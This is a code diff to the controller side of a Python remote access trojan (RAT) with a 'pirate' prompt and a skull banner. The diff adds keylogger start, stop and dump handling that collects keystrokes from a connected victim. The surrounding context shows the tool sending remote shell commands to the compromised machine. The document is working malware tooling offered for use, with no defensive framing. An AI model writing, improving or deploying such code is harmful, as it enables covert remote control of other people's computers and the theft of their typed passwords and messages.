@@ -10,40 +10,45 @@ class RAT:
         self.address = ('',port)
         self.port = port
         self.socket = socket(AF_INET, SOCK_STREAM)
+        self.keylogger_started = False
 
     def banner(self):
         print('''	
- @@@@@                                        @@@@@
-@@@@@@@                                      @@@@@@@
-@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
- @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
-     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
-       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
-         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
-            @@@@@@@    @@@@@@    @@@@@@
-            @@@@@@      @@@@      @@@@@
-            @@@@@@      @@@@      @@@@@
-             @@@@@@    @@@@@@    @@@@@
-              @@@@@@@@@@@  @@@@@@@@@@
-               @@@@@@@@@@  @@@@@@@@@
-           @@   @@@@@@@@@@@@@@@@@   @@
-           @@@@  @@@@ @ @ @ @ @@@@  @@@@
-          @@@@@   @@@ @ @ @ @ @@@   @@@@@
-        @@@@@      @@@@@@@@@@@@@      @@@@@
-      @@@@          @@@@@@@@@@@          @@@@
-   @@@@@              @@@@@@@              @@@@@
-  @@@@@@@                                 @@@@@@@
-   @@@@@                                   @@@@@''')
+\t\t @@@@@                                        @@@@@
+\t\t@@@@@@@                                      @@@@@@@
+\t\t@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
+\t\t @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
+\t\t     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
+\t\t       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
+\t\t         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
+\t\t            @@@@@@@    @@@@@@    @@@@@@
+\t\t            @@@@@@      @@@@      @@@@@
+\t\t            @@@@@@      @@@@      @@@@@
+\t\t             @@@@@@    @@@@@@    @@@@@
+\t\t              @@@@@@@@@@@  @@@@@@@@@@
+\t\t               @@@@@@@@@@  @@@@@@@@@
+\t\t           @@   @@@@@@@@@@@@@@@@@   @@
+\t\t           @@@@  @@@@ @ @ @ @ @@@@  @@@@
+\t\t          @@@@@   @@@ @ @ @ @ @@@   @@@@@
+\t\t        @@@@@      @@@@@@@@@@@@@      @@@@@
+\t\t      @@@@          @@@@@@@@@@@          @@@@
+\t\t   @@@@@              @@@@@@@              @@@@@
+\t\t  @@@@@@@                                 @@@@@@@
+\t\t   @@@@@                                   @@@@@''')
 
     def listen(self):
         s = self.socket
         s.bind(self.address)
         s.listen()
-        print('Listening on port: %i'%self.port)
+        print('\n\t\t\t     [*] Listening on port: %i'%self.port)
         self.conn, self.addr = s.accept()
-        print('[+] Connection received from',self.addr)
+        print('\t\t\t     [+] Connection received from',self.addr)
         self.main()
-    
+    def clear(self):
+        if sys.platform.startswith('win'):
+            os.system('cls')
+        else:
+            os.system('clear')
     def help(self):
         print('help:\tshow this message')
         print('clear:\tclear console')            
@@ -57,10 +62,11 @@ class RAT:
 
     def main(self):
         print()
+        started = self.keylogger_started
         while 1:
             EXIT = False
             conn = self.conn
-            cmd = input('pirate> ')
+            cmd = input('pirate@%s> '%self.addr[0])
             if cmd == 'shell':
                 while EXIT != True:
                     cmd = input('shell@%s# '%self.addr[0])
@@ -72,10 +78,7 @@ class RAT:
                         conn.send(('shell:'+cmd).encode())
                         print(conn.recv(50000).decode('Latin-1'))
             elif cmd == 'clear':
-                if sys.platform.startswith('win'):
-                    os.system('cls')
-                else:
-                    os.system('clear')
+                self.clear()
             elif cmd == 'help':
                 self.help()
 
@@ -122,7 +125,6 @@ class RAT:
                 conn.send(cmd.encode())
                 msg = conn.recv(1024).decode()
                 print(msg)
-            
             elif cmd.startswith('keylogger'):
                 if cmd == 'keylogger':
                     print('Usage:')
@@ -131,9 +133,21 @@ class RAT:
                     print('kelogger --stop')
                 elif cmd.startswith('keylogger --'):
                     msg = 'keylogger:'+cmd.split('--')[1]            
-                    conn.send(msg)
+                    conn.send(msg.encode())
+                    if cmd == 'keylogger --start':
+                        started = True
+                    elif cmd == 'keylogger --stop':
+                        started = False
+                    if cmd == 'keylogger --dump':
+                        if started:
+                            print(conn.recv(2048).decode())
+                        else:
+                            print('[!] Error, keylogger not started!')
             elif cmd == '':
                 pass
+
+            elif cmd == 'exit':
+                exit()
             else:
                 print('Invalid command!\n')
     
@@ -150,5 +164,3 @@ if args!=None:
     main.clear()
     main.banner()
     main.listen()
-    
-
